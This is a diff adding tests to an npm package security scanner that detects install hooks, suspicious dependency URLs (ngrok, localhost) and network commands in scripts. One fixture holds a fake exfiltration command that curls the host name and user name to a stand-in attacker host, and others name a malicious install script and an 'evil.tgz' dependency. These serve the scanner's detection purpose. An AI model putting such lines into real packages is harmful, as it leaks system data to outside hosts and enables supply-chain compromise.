@@ -132,6 +132,94 @@ async function runPackageTests() {
     } finally { cleanupTemp(tmp); }
   });
 
+  // --- install hook detection (P2) ---
+
+  await asyncTest('PACKAGE: Detects install script hook', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
+      name: 'test-pkg', version: '1.0.0',
+      scripts: { install: 'node malicious.js' }
+    }));
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'lifecycle_script' && t.message.includes('"install"'));
+      assert(t, 'Should detect install script hook');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Dependency URL detection (P3) ---
+
+  await asyncTest('PACKAGE: Detects ngrok dependency URL as HIGH', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
+      name: 'test-pkg', version: '1.0.0',
+      dependencies: { 'depconf': 'https://abc123.ngrok-free.app/pkg.tgz' }
+    }));
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dependency_url_suspicious');
+      assert(t, 'Should detect ngrok URL dependency');
+      assert(t.severity === 'HIGH', 'ngrok URL should be HIGH severity');
+      assertIncludes(t.message, 'tunnel', 'Should mention tunnel');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('PACKAGE: Detects localhost dependency URL as HIGH', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
+      name: 'test-pkg', version: '1.0.0',
+      dependencies: { 'my-dep': 'http://localhost:8080/evil.tgz' }
+    }));
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dependency_url_suspicious');
+      assert(t, 'Should detect localhost URL dependency');
+      assert(t.severity === 'HIGH', 'localhost URL should be HIGH severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('PACKAGE: Detects generic HTTPS dependency URL as MEDIUM', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
+      name: 'test-pkg', version: '1.0.0',
+      dependencies: { 'my-dep': 'https://example.com/my-package.tgz' }
+    }));
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'dependency_url_suspicious');
+      assert(t, 'Should detect generic HTTPS URL dependency');
+      assert(t.severity === 'MEDIUM', 'Generic HTTPS URL should be MEDIUM severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- Network commands in non-lifecycle scripts (test, start, etc.) ---
+
+  await asyncTest('PACKAGE: Detects curl in test script', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
+      name: 'test-pkg', version: '1.0.0',
+      scripts: { test: "curl 'http://evil.oastify.com/?$(hostname)=$(whoami)'" }
+    }));
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'lifecycle_script' && t.message.includes('"test"'));
+      assert(t, 'Should detect curl in test script');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('PACKAGE: No FP for normal test script', async () => {
+    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pkg-'));
+    fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
+      name: 'test-pkg', version: '1.0.0',
+      scripts: { test: 'jest --coverage', start: 'node index.js' }
+    }));
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'lifecycle_script');
+      assert(!t, 'Normal test/start scripts should not trigger');
+    } finally { cleanupTemp(tmp); }
+  });
+
   // Marker tests (grouped under package scanner)
   console.log('\n=== MARKER TESTS ===\n');
 
